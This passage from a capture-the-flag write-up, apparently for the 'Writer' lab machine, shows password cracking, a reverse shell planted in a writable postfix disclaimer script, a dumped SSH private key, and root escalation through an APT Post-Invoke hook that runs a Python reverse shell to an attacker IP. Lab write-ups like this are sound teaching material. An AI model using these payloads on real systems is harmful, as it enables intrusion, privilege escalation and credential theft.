echo 'pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=' > kyle.hash
```

Comparing the hash to hashcat example hashes it looks like a Django hash, which is used in Flask as well, let's try that.
![hashcat_examples](assets/writer_screenshots/hashcat_examples.png)

```bash
hashcat -m 10000 kyle.hash /usr/share/wordlists/passwords/rockyou.txt
```

And we get a password

```txt
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
```

![hashcat_found_pass](assets/writer_screenshots/hashcat_found_pass.png)

Let's try su'ing as kyle now we have a potential password.

```bash
su kyle
```

![su_kyle](assets/writer_screenshots/su_kyle.png)

We can now ssh in as kyle for persistent shell.

```bash
ssh kyle@10.129.212.12
```

We can get the user flag.

```bash
cat user.txt
d..............................4
```

## More PrivEsc

Kyle is just a user, but he’s in the filter and smbgroup groups, so we’ll see what we can do with that. Let’s look into the filter group first.

```bash
kyle@writer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
kyle@writer:~$ find / -group filter -ls 2>/dev/null
    16282      4 -rwxrwxr-x   1 root     filter       1021 Dec 13 13:50 /etc/postfix/disclaimer
    16281      4 drwxr-x---   2 filter   filter       4096 May 13  2021 /var/spool/filter
```

We can edit the postfix disclaimer. Let's see what we can do with that.

```bash
cd /etc/postfix/; grep -R -i 'disclaimer'
disclaimer:# Get disclaimer addresses
disclaimer:DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses
disclaimer:if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
disclaimer:                   --disclaimer=/etc/postfix/disclaimer.txt \
disclaimer:                   --disclaimer-html=/etc/postfix/disclaimer.txt \
master.cf:  flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
```

Looks like the `/etc/postfix/disclaimer` file is being loaded as an argument when mail is sent.

Let's edit the file, insert a reverse shell payload and then try and send an email.

```bash
vim /etc/postfix/disclaimer
```

```bash
#!/bin/sh
# Localize these.
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.54/9001 0>&1"
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```

Start another netcat listener

```bash
nc -lvnp 9001
```

Create a python script to send mail

```bash
vim /dev/shm/send_mail.py
```

```py
import smtplib

host = '127.0.0.1'
port = 25

sender_email = "kyle@writer.htb"
receiver_email = "kyle@writer.htb"
message = """\
        Subject: Hi there


        Test_python_sender."""
try:
    server = smtplib.SMTP(host, port)
    server.ehlo()
    server.sendmail(sender_email, receiver_email, message)
except Exception as e:
    print(e)
finally:
    server.quit()
```

Run our script and see if we get a shell.

```bash
python3 /dev/shm/send_mail.py
```

![john_rev_shell](assets/writer_screenshots/john_rev_shell.png)

We caught the reverse shell, we can do the python pty trick again to get a proper pty.

```bash
john@writer:/$ python3 -c "import pty;pty.spawn('/bin/bash')"
john@writer:/$ ^Z
fish: Job 1, 'nc -lvnp 9001' has stopped
tuz@hackbox ~> stty echo -raw;fg
Send job 1, “nc -lvnp 9001” to foreground

john@writer:/$ export TERM=xterm
```

We can also read John's ssh private key and use that to ssh in to the box as John.

```bash
john@writer:/home/john$ cat ~/.ssh/id_rsa
```

```txt
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

![john_private_key](assets/writer_screenshots/john_private_key.png)

Paste the private key into a file on our attacker box

```bash
vim john.id_rsa
```

And set the file to be readable only by us, as ssh likes it.

```bash
chmod 600 john.id_rsa
```

Then login to ssh as john using his private key.

```bash
ssh -i john.id_rsa john@10.129.212.12
```

![john_ssh](assets/writer_screenshots/john_ssh.png)

John is in the management group, let's see what he can do.

```bash
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
john@writer:~$ find / -group 1003 -ls 2>/dev/null
    17525      4 drwxrwxr-x   2 root     management     4096 Jul 28 09:24 /etc/apt/apt.conf.d
```

John can write to the apt config directory.

We can't find a cron running in the crontab, let's look at the running processes with ps.
We can see that apt-get update is periodically running.

```bash
watch -n 1 "ps aux | grep 'apt'"
```

![ps_grep_apt](assets/writer_screenshots/ps_grep_apt.png)

We should be able to exploit this by creating a script in the apt config directory, then when apt-get update is run it should execute our script.

[apt_privesc](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/)

Let's create a python reverse shell.

```bash
vim /dev/shm/rev.py
```

```py
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.54",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

Start another netcat listener on our attacker

```bash
nc -lvnp 9001
```

Create the apt config file on a loop, so that it gets picked up by apt-get update.

```bash
while true; do echo 'APT::Update::Post-Invoke {"python3 /dev/shm/rev.py";};' > /etc/apt/apt.conf.d/02-pwn; sleep 1; done
```

Wait for the update to start and catch a root reverse shell.

![root_rev_shell](assets/writer_screenshots/root_rev_shell.png)
